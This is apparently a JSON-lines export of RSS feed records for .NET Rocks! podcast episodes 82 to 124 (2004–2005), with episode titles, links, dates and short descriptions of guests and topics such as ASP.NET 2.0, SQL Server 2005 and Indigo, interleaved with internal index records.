{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=124","title":"Richard Costall and Andy Brown","published":{"$wrap":"$date","v":1122782400000,"h":"2005-07-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Richard Costall and Andy Brown talk about two large scale production applications, one Smart Client and one ASP.NET app based on the beta 2 release of VS 2005 and the Framework 2.0.  Hear about how they have dealt with compatability in a heterogenous client envyronment, some praise for the Microsoft Ascend program, how they utilize Web Services and ADO.NET, and more!","author":false,"_id":{"$wrap":"$oid","v":768}}
{"k":"0000000082","o":"0000000623","v":"001"}
{"_id":769,"_uid":769,"_dt":1373728934317,"_s":"41cfdc14c508bb3611d8da41d9398bf6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=123","title":"Chris Kinsman on data warehousing and other topics","published":{"$wrap":"$date","v":1122177600000,"h":"2005-07-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Chris Kinsman drops in to talk about some of the projects he's been working on lately. Topics include data warehousing, SQL Integration Services, the recently released Patterns and Practices Enterprise Library, and a Compact Framework project to interface with slot machines! Cool stuff, indeed.","author":false,"_id":{"$wrap":"$oid","v":769}}
{"k":"0000000082","o":"0000000751","v":"001"}
{"_id":770,"_uid":770,"_dt":1373728934318,"_s":"a561346f416930257dafa2e9593923b6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=122","title":"Russ Nemhauser Talks Mobility + More","published":{"$wrap":"$date","v":1121659200000,"h":"2005-07-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Russ Nemhauser talks to Carl and Richard about mobility via the Smart Phone platforms, including some model specifics, shortcomings, and differences versus the Pocket PC platform.  Russ, Carl and Richard also touch on the issues with VB6 developers moving to VB.NET, and how VS 2005 could make the transition easier.  They also get into some great detail about stress testing and tracking down sluggish code in Visual Studio Team System.","author":false,"_id":{"$wrap":"$oid","v":770}}
{"k":"0000000082","o":"0000000547","v":"001"}
{"_id":771,"_uid":771,"_dt":1373728934319,"_s":"b55a9ca5c3d759c9f1b940b7aee51a7e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=121","title":"Kathleen Dollard Talks Generic","published":{"$wrap":"$date","v":1121054400000,"h":"2005-07-11T04:00:00.000Z"},"starred":false,"read":false,"content":"In this episode, Kathleen Dollard is visiting Carl in the studio, and they get a great dynamic going while they talk about the finer points of generics and all the geeky stuff we're getting ready to sink our teeth into in the 2005 release.","author":false,"_id":{"$wrap":"$oid","v":771}}
{"k":"0000000082","o":"0000000698","v":"001"}
{"_id":772,"_uid":772,"_dt":1373728934320,"_s":"48801fe4699e8d49f08c2f592931b4a4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=120","title":"Carl and Richard talk with Sanjay","published":{"$wrap":"$date","v":1120449600000,"h":"2005-07-04T04:00:00.000Z"},"starred":false,"read":false,"content":"A talk with Sanjay Parthasarathy, Microsoft corporate vice president of Developer and Platform Evangelism. There are so many great nuggets in this episode.. just listen to it! We discover Sanjay is a toy boy like us. You'll hear about life at Microsoft before their current brand of evangelism took root. Also, the challenges of running a division of Microsoft that is not profit-driven.","author":false,"_id":{"$wrap":"$oid","v":772}}
{"k":"0000000082","o":"0000000630","v":"001"}
{"_id":773,"_uid":773,"_dt":1373728934321,"_s":"0a0e77502d0c3a7a3e09fcb97da41a5e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=119","title":"Rob Howard on ASP.NET","published":{"$wrap":"$date","v":1119758400000,"h":"2005-06-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Rob Howard- star of stage, screen, and ASP.NET- drops in to talk to Carl and Richard about ASP.NET past, present, and future. Rob shares his insights as well as a few stories from his days on the ASP.NET team at Microsoft. He also talked about his current gig with Telligent Systems, and what excites him the most about ASP.NET 2.0","author":false,"_id":{"$wrap":"$oid","v":773}}
{"k":"0000000082","o":"0000000366","v":"001"}
{"_id":774,"_uid":774,"_dt":1373728934321,"_s":"f020d4312c8d983ae41c4047d299dada"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=118","title":"PDC Preview","published":{"$wrap":"$date","v":1119240000000,"h":"2005-06-20T04:00:00.000Z"},"starred":false,"read":false,"content":"On this show, some of the PDC planners talk about what you can expect to see!","author":false,"_id":{"$wrap":"$oid","v":774}}
{"k":"0000000082","o":"0000000507","v":"001"}
{"_id":775,"_uid":775,"_dt":1373728934322,"_s":"d8fb66c9519e2aba49a14bf71799dc63"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=117","title":"Team System - Live at Tech Ed!","published":{"$wrap":"$date","v":1118635200000,"h":"2005-06-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard come at you live from Tech Ed Orlando, interviewing the Team System team.  Find out what will (and won't) be included in 1.0, and get an idea what you can expect in the next version.","author":false,"_id":{"$wrap":"$oid","v":775}}
{"k":"0000000082","o":"0000000522","v":"001"}
{"_id":776,"_uid":776,"_dt":1373728934323,"_s":"27ae80dba4ac2e04a2ded361e428be36"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=116","title":"Michele Leroux Bustamante talks WSE, Indigo, and Security","published":{"$wrap":"$date","v":1118030400000,"h":"2005-06-06T04:00:00.000Z"},"starred":false,"read":false,"content":"In this great episode of Dot Net Rocks, Michele returns once again to discuss WSE, Indigo, and Security. In particular, she discusses the challenges around keeping keys and tokens secure.","author":false,"_id":{"$wrap":"$oid","v":776}}
{"k":"0000000082","o":"0000000538","v":"001"}
{"_id":777,"_uid":777,"_dt":1373728934324,"_s":"99734a8bc2eb02c1358168263db79759"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=115","title":"Jackie Goldstein Part 1","published":{"$wrap":"$date","v":1117339200000,"h":"2005-05-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Jackie Goldstein talks about Visual Basic and Visual Basic .NET in this excellent discussion.We had a great time talking to Jackie Goldstein but we were only able to cover half the topics we wanted to. Look for part two later on in 2005.","author":false,"_id":{"$wrap":"$oid","v":777}}
{"k":"0000000082","o":"0000000714","v":"001"}
{"_id":778,"_uid":778,"_dt":1373728934325,"_s":"8ed26c887115d5c0c989132d8c849c87"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=114","title":"Brian Randell on Microsoft Virtual PC","published":{"$wrap":"$date","v":1116820800000,"h":"2005-05-23T04:00:00.000Z"},"starred":false,"read":false,"content":"We thought we were going to cover a lot of topics in this episode of Dot Net Rocks, but we managed to go over an hour without straying from Virtual PC at all.  This is a must-listen show for anyone who isn't already an expert in Virtual PC or Virtual Server.  Brain Randell explains the advantages and disadvantages, warns you of some potential pitfalls, and shows you how you can boost performance!","author":false,"_id":{"$wrap":"$oid","v":778}}
{"k":"0000000082","o":"0000000522","v":"001"}
{"_id":779,"_uid":779,"_dt":1373728934326,"_s":"5ac9ac6ff02a57cbfad1d18c58320a5f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=113","title":"Scott Guthrie with more on ASP.NET 2.0","published":{"$wrap":"$date","v":1116129600000,"h":"2005-05-15T04:00:00.000Z"},"starred":false,"read":false,"content":"He's Back! The man responsible for the IIS team, the ASP. NET team, and the visual Studio Web Tools team gives us an update on ASP.NET 2.0, IIS 7.0, and even a hint at Orcas, the next .NET rev after Whidbey","author":false,"_id":{"$wrap":"$oid","v":779}}
{"k":"0000000082","o":"0000000590","v":"001"}
{"_id":780,"_uid":780,"_dt":1373728934327,"_s":"4f83a7da370fb5b1bf9358b1fb983d37"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=112","title":"Dot Net Nuke 3.0!","published":{"$wrap":"$date","v":1115611200000,"h":"2005-05-09T04:00:00.000Z"},"starred":false,"read":false,"content":"We return to Dot Net Nuke, with Jim Duffy and Shaun Walker, who talk about the amazing pluggability and skinability of Dot Net Nuke.  We discuss the changes between 2.0 and 3.0, the philosophy of Open Source development, and even get a glimpse at what we might see in the future of Dot Net Nuke.","author":false,"_id":{"$wrap":"$oid","v":780}}
{"k":"0000000082","o":"0000000442","v":"001"}
{"_id":781,"_uid":781,"_dt":1373728934328,"_s":"04e935970a91b1823dc8c3d3fdfecc10"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=111","title":"Mood Indigo","published":{"$wrap":"$date","v":1115006400000,"h":"2005-05-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl talks with Richard Turner and Anand Rajagapolan, Program Managers on the Indigo team to really dig into the Indigo experience. This is a great show!","author":false,"_id":{"$wrap":"$oid","v":781}}
{"k":"0000000082","o":"0000000630","v":"001"}
{"_id":782,"_uid":782,"_dt":1373728934329,"_s":"6357e1060127f169789b934d45b6e3b6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=110","title":"Kimberly Tripp on SQL 2005","published":{"$wrap":"$date","v":1114401600000,"h":"2005-04-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Kim Tripp is back and more intense than ever. After talking about her famous USB Key demonstration of SQL 2005 partitioning, she gets into details of SQL 2005 that would make even the SQL team go \"hey, that's cool!\" This is one of those shows that you'll have to listen to several times to completely grasp. We know we will!","author":false,"_id":{"$wrap":"$oid","v":782}}
{"k":"0000000082","o":"0000000609","v":"001"}
{"_id":783,"_uid":783,"_dt":1373728934330,"_s":"e79328528e8d5e3aad4113c05017cdc9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=109","title":"Matt Mannion Goes to the Races!","published":{"$wrap":"$date","v":1113710400000,"h":"2005-04-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Matt Mannion from Clarity Consulting talks about the application his company developed with and for the Indy Racing League in Indianappolis, IN. Using Visual Studio .NET 2003 and VB.NET they were able to develop a great application for managing real-time racing data and reporting. Fascinating story.","author":false,"_id":{"$wrap":"$oid","v":783}}
{"k":"0000000082","o":"0000000621","v":"001"}
{"_id":784,"_uid":784,"_dt":1373728934331,"_s":"7371a136e8b41a777b2e6c352644426c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=108","title":"Live from the Microsoft Platform Adoption Center","published":{"$wrap":"$date","v":1113192000000,"h":"2005-04-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Grant BlahaErath and Glenn Podany talk about the MS Platform Adoption Center: what it is and what it's used for. Sometimes called the Customer Lab, the PAC has generated some great case studies with major companies implementing Microsoft technologies. Great stories and geeking out on this show!","author":false,"_id":{"$wrap":"$oid","v":784}}
{"k":"0000000082","o":"0000000607","v":"001"}
{"_id":785,"_uid":785,"_dt":1373728934331,"_s":"8ca5164363bba81fbbc0531b0b49cea6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=107","title":"Scott Hanselman and Rory Blyth","published":{"$wrap":"$date","v":1112587200000,"h":"2005-04-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott Hanselman returns to DNR for the first time in several months.  In this otherwise ASP.NET-centric show, Rory shows off his hands-free flush abilities and Scott rants about Cascading Style Sheets.  A great show with more nutritional value than you might expect.  Welcome back to the show, Rory!","author":false,"_id":{"$wrap":"$oid","v":785}}
{"k":"0000000082","o":"0000000471","v":"001"}
{"_id":786,"_uid":786,"_dt":1373728934332,"_s":"ee614f4e8b84bcc726abc69ce0028f39"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=106","title":"Rocky Lhotka and Bill Vaughn Live at Dev Connections!","published":{"$wrap":"$date","v":1111896000000,"h":"2005-03-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Rhocky Lhotka and Bill Vaughn return in this *live* recording of Dot Net Rocks, from the March 2005 Dev Connections conferene in Orlando, FL","author":false,"_id":{"$wrap":"$oid","v":786}}
{"k":"0000000082","o":"0000000442","v":"001"}
{"_id":787,"_uid":787,"_dt":1373728934333,"_s":"5acb0a0ee743e0f9ed6e95f0da45189f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=105","title":"Ken Getz Does a Mind Meld","published":{"$wrap":"$date","v":1111377600000,"h":"2005-03-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Ken Getz comes back for round 2 with .NET Rocks! talking about new features of VB.NET 2005, SharePoint and WSS, wireless service, and toys!","author":false,"_id":{"$wrap":"$oid","v":787}}
{"k":"0000000082","o":"0000000562","v":"001"}
{"_id":788,"_uid":788,"_dt":1373728934334,"_s":"39340a9ef80384bb1238bd5313ed1b96"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=104","title":"Paul Sheriff on Architecture","published":{"$wrap":"$date","v":1110772800000,"h":"2005-03-14T04:00:00.000Z"},"starred":false,"read":false,"content":"World-renowned author and trainer Paul Sheriff talks with Carl and Richard about all things architecture: what, why, when, where, and how. Even if you have no plans to move beyond the cowboy way of software development, this discussion will make you think.","author":false,"_id":{"$wrap":"$oid","v":788}}
{"k":"0000000082","o":"0000000602","v":"001"}
{"_id":789,"_uid":789,"_dt":1373728934335,"_s":"ad1114796c8aff35f23a3b2d5a75ebf3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=103","title":"Chris Anderson and the Longhorn Evangelism Team","published":{"$wrap":"$date","v":1110168000000,"h":"2005-03-07T04:00:00.000Z"},"starred":false,"read":false,"content":"This is a great show on what's coming in Longhorn technology, namely Indigo, Avalon, and XAML, and compatibility. We get to the heart of what the term \"Managed OS\" really means. Jeff Sandquist tries to decide whether or not to shave his mustache. He's had it since he was 16.","author":false,"_id":{"$wrap":"$oid","v":789}}
{"k":"0000000082","o":"0000000713","v":"001"}
{"_id":790,"_uid":790,"_dt":1373728934336,"_s":"2c1e64d2fe8ce3e59a2f0cf96043abe5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=102","title":"NASA World Wind Development Team","published":{"$wrap":"$date","v":1109563200000,"h":"2005-02-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Chris Maxwell and Randy Kim from the National Aeronautics and Space Administration talk about their recent .NET project, World Wind, an educational and informational tool for viewing planet Earth (and other planets). The program was written in Visual Studio .NET with managed DirectX, and is open source.  Geoff steps out from behind the sound board and ends up asking most of the really good questions.","author":false,"_id":{"$wrap":"$oid","v":790}}
{"k":"0000000082","o":"0000000485","v":"001"}
{"_id":791,"_uid":791,"_dt":1373728934337,"_s":"87338b8c6ccf29770a9e754e4812c70d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=101","title":"Mark Miller on How to be a Better Programmer","published":{"$wrap":"$date","v":1108958400000,"h":"2005-02-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Miller returns again, and is in the studio with Carl talking about his sordid past with Delphi, some development choices he's made, pair porgramming, and GDI+","author":false,"_id":{"$wrap":"$oid","v":791}}
{"k":"0000000082","o":"0000000526","v":"001"}
{"_id":792,"_uid":792,"_dt":1373728934338,"_s":"88b8b931c7c3cff7f199e3d1a7a02de9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=100","title":"We Have Arrived!","published":{"$wrap":"$date","v":1108440000000,"h":"2005-02-15T04:00:00.000Z"},"starred":false,"read":false,"content":"We have arrived at our 100th show!  Richard Campbell, Mark Dunn, Nick Landry, Geoff Maciolek, and Chris Sells join Carl in this look at shows past, present, and future. Lots of fun and you'll learn a few things too, as we always do.","author":false,"_id":{"$wrap":"$oid","v":792}}
{"k":"0000000082","o":"0000000722","v":"001"}
{"_id":793,"_uid":793,"_dt":1373728934338,"_s":"6ae43f345b88894b3a7827cb145dd7b9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=99","title":"Forte on SQL 2005","published":{"$wrap":"$date","v":1107748800000,"h":"2005-02-07T04:00:00.000Z"},"starred":false,"read":false,"content":"New York Regional Director Stephen Forte talks with Carl and Rory about many cool things, including SQL Server 2005 (Yukon). He's got some good advice for how to get the most out of it. As well, the conversation turned to clustering and RAID strategies. This was a great talk with one of the Northeast's sharpest .NET minds, not to mention mountain climbers and extreme... well, let's just say he's extreme and leave it at that.","author":false,"_id":{"$wrap":"$oid","v":793}}
{"k":"0000000082","o":"0000000872","v":"001"}
{"_id":794,"_uid":794,"_dt":1373728934339,"_s":"3b47dedd75dbda5248f2d70cf710a9e9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=98","title":"Mark Dunn on ADO.NET 2.0 and BizTalk 2004","published":{"$wrap":"$date","v":1107144000000,"h":"2005-01-31T04:00:00.000Z"},"starred":false,"read":false,"content":"As the original co-host of .NET Rocks!, mark didn't say all that much. Well, look out! He's talking about his current passions, ADO.NET 2.0 and BizTalk 2004, and we can't shut him up! This is a great conversation with a true ADO.NET expert. Mark has a knack for explaining complex ideas in a very natural and easy manner.  If you still don't get BizTalk, this is the show to listen to. Mark explains why BizTalk is great from a very practical perspective, and explains why he is on a crusade to get developers as excited about BizTalk as IT managers are.","author":false,"_id":{"$wrap":"$oid","v":794}}
{"k":"0000000082","o":"0000000440","v":"001"}
{"_id":795,"_uid":795,"_dt":1373728934340,"_s":"3dfd7dd6d278e99146d99aca48f36be5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=97","title":"Carl and Rory Catch Up","published":{"$wrap":"$date","v":1106539200000,"h":"2005-01-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Rory catch up after Rory's long haitus. Topics include Smartphone programming, responding to an article blasting OOP, and much more.","author":false,"_id":{"$wrap":"$oid","v":795}}
{"k":"0000000082","o":"0000000498","v":"001"}
{"_id":796,"_uid":796,"_dt":1373728934342,"_s":"208b5fc0073284c9346a4d9e64c4dc21"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=96","title":"Talking with Robert Hurlbut","published":{"$wrap":"$date","v":1105934400000,"h":"2005-01-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Independent Software developer and Visual C# MVP Robert Hurlbut joins Carl in the studio this week for a discussion about security, least-privileged development, and the SQL 2005 Service Broker.","author":false,"_id":{"$wrap":"$oid","v":796}}
{"k":"0000000082","o":"0000000506","v":"001"}
{"_id":797,"_uid":797,"_dt":1373728934343,"_s":"2b2393db23072edda3ffff160c3f64b4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=95","title":"Talking Smart Clients with Rob Barker","published":{"$wrap":"$date","v":1104120000000,"h":"2004-12-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Rob Barker from microsoft engages Carl and Rory in a conversation about leveraging Infopath, the Information Bridge Framework, and Visual Studio Tools for Office 2003 to develop smart clients.","author":false,"_id":{"$wrap":"$oid","v":797}}
{"k":"0000000082","o":"0000000758","v":"001"}
{"_id":798,"_uid":798,"_dt":1373728934343,"_s":"b42a20dc93a2db4448cbca2c2c49854b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=94","title":"Hanging out with Bernard Wong","published":{"$wrap":"$date","v":1103515200000,"h":"2004-12-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Bernard Wong from MSDN talks with Carl and Rory this week. What's on his mind? For starters, the old and tired questions asked of him at developer conferences, what Bill and Steve really say at those high level meetings in Redmond, amrchair CEOs, and other observations. Bernard always has great stories to tell. This is the last show of 2004. We'll be back on January 10th, 2005! Until then, we hope everyone enjoys a little time off for the holidays!","author":false,"_id":{"$wrap":"$oid","v":798}}
{"k":"0000000082","o":"0000000594","v":"001"}
{"_id":799,"_uid":799,"_dt":1373728934344,"_s":"f1f51a4144e227c764c22bc27e0fe6db"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=93","title":"Brian Larson on SQL Reporting Services","published":{"$wrap":"$date","v":1102910400000,"h":"2004-12-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Brian Larson talks to Carl and Rory, who is recovering from being sick and on the road, about SQL Reporting Services: architecture, cool features, innovative uses, performance tips, new features in SQL 2005 Reporting Services, and Business Intelligence opportunities in SQL 2005.","author":false,"_id":{"$wrap":"$oid","v":799}}
{"k":"0000000082","o":"0000000578","v":"001"}
{"_id":800,"_uid":800,"_dt":1373728934345,"_s":"4230c3a4453a4859a4d1f0c08544eec3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=92","title":"Windows Server Technology","published":{"$wrap":"$date","v":1102305600000,"h":"2004-12-06T04:00:00.000Z"},"starred":false,"read":false,"content":"While Rory is living it up in Vegas Carl interviews seven Microsoft program managers and evanglists about the current state of Windows Server 2003 as well as what's on tap for future releases; 64-bit computing and why it's so cool; server security, and J2EE to .NET migration.","author":false,"_id":{"$wrap":"$oid","v":800}}
{"k":"0000000082","o":"0000000551","v":"001"}
{"_id":801,"_uid":801,"_dt":1373728934346,"_s":"2e5a014c560d8d9bc5d3b6ac41404c5d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=91","title":"Billy Hollis digs into smart client architecture","published":{"$wrap":"$date","v":1101700800000,"h":"2004-11-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Billy Hollis went beyond the general smart client discussion we usually have and dug into architecure issues. What works? What doesn't work? Listen to Billy's stories from the field and learn from his experience. Awesome show.","author":false,"_id":{"$wrap":"$oid","v":801}}
{"k":"0000000082","o":"0000000572","v":"001"}
{"_id":802,"_uid":802,"_dt":1373728934347,"_s":"cdcd4ab324e744f8aaf39c52036a928d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=90","title":"Catching up with Julie Lerman","published":{"$wrap":"$date","v":1101268800000,"h":"2004-11-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Julie Lerman talks about her recent experiences with the Base Class Library 2.0, Tablet PC development and ADO.NET 2.0. She also talks about her professional life before software development, which may come as a bit of a shock. All-in-all it was a good conversation.","author":false,"_id":{"$wrap":"$oid","v":802}}
{"k":"0000000082","o":"0000000611","v":"001"}
{"_id":803,"_uid":803,"_dt":1373728934348,"_s":"c6b4007cc19dad27bdaec3b630727c0f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=89","title":"Mark Pollack, Ted Neward, and Don Box on Java, .NET, and the future","published":{"$wrap":"$date","v":1100664000000,"h":"2004-11-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Dare we say the future? This show was originally intended to be a discussion about Java and Spring.NET with Mark Pollack. Then Ted was invited, and he invited Don. The result is an almost two hour discussion of Java and .NET. This is definitely going to be a classic.","author":false,"_id":{"$wrap":"$oid","v":803}}
{"k":"0000000082","o":"0000000600","v":"001"}
{"_id":804,"_uid":804,"_dt":1373728934349,"_s":"e7e65814e0c46e5996dc78b8658e848c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=88","title":"Kate Gregory on C+++, VB.NET, and VSTO","published":{"$wrap":"$date","v":1099886400000,"h":"2004-11-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Kate Gregory talks to Carl (in this retro interview-only show) about the new C++, why she prefers VB.NET over C#, Visual Studio Tools for Office, OOP, Sockets, and merry old England!  This is the first of our attempt to make .NET Rocks! more geeky and less freaky! We hope you like it!","author":false,"_id":{"$wrap":"$oid","v":804}}
{"k":"0000000082","o":"0000000724","v":"001"}
{"_id":805,"_uid":805,"_dt":1373728934349,"_s":"218633d85b7da98c21e1e40528b989c1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=87","title":"Jay Roxe Rocks!","published":{"$wrap":"$date","v":1099281600000,"h":"2004-11-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Microsoft Product Manager for Visual Basic.NET, Jay Roxe drops by to talk about his work on the .NET Framework including System.Object, System.String, and System.Text.StringBuilder. In the second half he talks about VB.NET 2005, about the decisions Microsoft made regarding features and ship dates, and about how he thinks VB.NET 2005 will go a long way toward making .NET accessible to the masses of business programmers worldwide.","author":false,"_id":{"$wrap":"$oid","v":805}}
{"k":"0000000082","o":"0000000975","v":"001"}
{"_id":806,"_uid":806,"_dt":1373728934350,"_s":"b0d12a92b409d33ac78bae01183a1ab5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=86","title":"Juval Löwy on .NET 2.0","published":{"$wrap":"$date","v":1098676800000,"h":"2004-10-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Juval Löwy joins Carl, Rory, and the gang this week for a romp through .NET 2.0 in all its glory. Juval talks about serialization now and in 2.0, the new System.Transaction namespace and how cool it really is, putting System.EnterpriseServices in perspective, some quick lip service to generics (although he discussed that in show #34), and a little criticism of the new Visual Studio 2005. Thom Robbins joins us in the second half to talk about his recent CodeCamp event, and the New England district. Richard is still climbing mountains, but Rory is on fire with Google Weirdos and Ask Rory. Kirk has some good websites as well. Warning: this show is rated at least PG-13.","author":false,"_id":{"$wrap":"$oid","v":806}}
{"k":"0000000082","o":"0000000984","v":"001"}
{"_id":807,"_uid":807,"_dt":1373728934351,"_s":"6b06855e31ec1593dc5364e461d7c6c7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=85","title":"The Whidbey Show","published":{"$wrap":"$date","v":1098072000000,"h":"2004-10-18T04:00:00.000Z"},"starred":false,"read":false,"content":"We try to have representatives from Microsoft on the show every once in a while to talk about what's happening in Redmond. This week we had four program managers for the Evangelism team: Scott Burmester, Steve Cellini, Carter Maslan, and Jeff Sandquist. The topic? Whidbey! We get a check up on the progress of the next version of .NET. We talked at length about the up-and-coming Visual Studio 2005 Team System, and the efforts to reach application developers who don't necessarily spend time in the development community. We also ask each of them to tell us something about Whidbey that we probably don't already know. All in all it's a good show, even if Rory and Richard are on vacation.","author":false,"_id":{"$wrap":"$oid","v":807}}
{"k":"0000000082","o":"0000000872","v":"001"}
{"_id":808,"_uid":808,"_dt":1373728934353,"_s":"f3915f1737e4eaf93b547ddb3e2c36bd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=84","title":"Chris Sells Checks In","published":{"$wrap":"$date","v":1097467200000,"h":"2004-10-11T04:00:00.000Z"},"starred":false,"read":false,"content":".NET Rocks! regular guest (and guest host) Chris Sells joins Carl and the gang for a really fun discussion (after he comments on the mail and news) about Longhorn and WinFX, Longhorn features on XP, working on the MSDN Smart Client DevCenter, VS.NET 2005, learning about new technologies, learning by teaching, and Avalon. He answers some good technical questions from live listeners, and overall makes the two hours fly by. Of course you get the mail, news of the week, Weird Wide Webb, and Ask Rory. Richard is away this week so Carl gave away an iPod to a lucky listener!","author":false,"_id":{"$wrap":"$oid","v":808}}
{"k":"0000000082","o":"0000000725","v":"001"}
{"_id":809,"_uid":809,"_dt":1373728934354,"_s":"339f25c33009c434726ed6d9d59ac591"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=83","title":"Fritz Onion on ASP.NET","published":{"$wrap":"$date","v":1096862400000,"h":"2004-10-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Noted author and software engineer Fritz Onion is our guest this week on .NET Rocks! After lavishing praise on F.O. for what seemed an eternity, Carl and Rory get down to the HTTP Pipeline, the HTTPContext, User Controls, Web Controls, and what Fritz likes (and dislikes) about the current beta of ASP.NET 2.0. Among other accomplishments, Fritz is the author of the best-selling Essential ASP.NET published by Addison Wesley.","author":false,"_id":{"$wrap":"$oid","v":809}}
{"k":"0000000082","o":"0000000782","v":"001"}
{"_id":810,"_uid":810,"_dt":1373728934355,"_s":"14ad6effa236035d54e271c88702d808"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=82","title":"Richard Hale Shaw Speaks!","published":{"$wrap":"$date","v":1096257600000,"h":"2004-09-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Industry guru Richard Hale Shaw talks to the guys about what's on his mind. Namely, patterns, practices, anti-practices and anti-patterns, best practices, patterns in .NET, the future of C++ and managed code, VB6 as the ultimate anti-pattern, lack of OOP in ASP.NET 1.1, and looking forward to ASP.NET 2.0. We also listened to a bit of one of Richard's favorite tunes, What is Hip by Tower of Power. Mail, News, New music from Rory Blyth, Weird Wide Webb, and Richard the Toy Boy.","author":false,"_id":{"$wrap":"$oid","v":810}}
{"k":"0000000082","o":"0000000885","v":"001"}
{"_id":811,"_uid":811,"_dt":1373728934356,"_s":"a91caebadb0c6eaae9c90069e5e2ecf3"}
